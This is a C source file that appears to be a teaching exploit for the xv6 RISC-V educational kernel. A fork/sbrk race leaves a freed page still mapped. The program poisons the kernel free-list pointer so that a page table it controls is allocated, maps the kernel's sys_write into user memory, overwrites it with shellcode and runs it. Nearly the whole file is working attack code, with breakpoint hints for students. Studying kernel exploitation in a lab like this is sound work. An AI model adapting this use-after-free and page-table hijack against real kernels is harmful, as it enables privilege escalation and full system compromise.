/* (c) <guenter.ebermann@htl-hl.ac.at> */
#include "kernel/types.h"
#include "kernel/riscv.h"
#include "user/user.h"
#include "user/shellcode.h"

#define TRIES 200
#define NEXT 0
#define MAGIC 1
#define MAGICVAL 0x0101010101010101UL
#define TBL2 0x87f42800UL
#define TBL1 0x87f72000UL
#define TBL0 0x87f43000UL
#define WRITE 0x80005170UL

int main(void)
{
	uint8 *p, *sys_write;
	uint64 *page, *tbl2, *tbl1, *tbl0;
	uint i;

	/* you can break on sys_mkdir */
	mkdir("breakpoint1");

	tbl0 = (uint64*)sbrk(PGSIZE);
	tbl1 = (uint64*)sbrk(PGSIZE);

	if (fork() == 0) {
		/* child race */
 		sbrk(PGSIZE * TRIES);

		/* free pages -> setting MAGICVAL */
		exit(0);
	}

	/* parent race */
	p = (uint8*)sbrk(PGSIZE * TRIES);

	/* wait for child */
	wait(0);

	/* now find a page which was freed but is still accessible */
	page = 0;
	for (i = 0; i < TRIES; i++) {
		page = (uint64*)(p + i * PGSIZE);
		if (page[MAGIC] == MAGICVAL) break;
	}

	if (page == 0) exit(-1);

	printf("found page va %p\n", page);

	/* poison the next pointer of the still accessible page */
	page[NEXT] = TBL2;

	/* alloc pages until our poisoned next pointer is put to top of freelist */
	do {
		sbrk(PGSIZE);
	} while (page[MAGIC] == MAGICVAL);

	/* you can break on sys_mkdir */
	mkdir("breakpoint2");

	/* now poison is on top of the freelist, which is the pagetable */
	tbl2 = (uint64*)sbrk(PGSIZE);

	/* memmap kernel's sys_write() */
	tbl2[1] = PA2PTE(TBL1) | PTE_V;
	tbl1[0] = PA2PTE(TBL0) | PTE_V;
	tbl0[0] = PA2PTE(WRITE) | PTE_V | PTE_R | PTE_W | PTE_U;
	sys_write = (uint8*)((0x1UL << PXSHIFT(2)) | (WRITE & (PGSIZE-1)));

	/* overwrite with shellcode */
	memcpy(sys_write, user_shellcode, user_shellcode_len);

	/* execute shellcode, you can break on sys_write */
	write(0, "", 0);

	return 0;
}
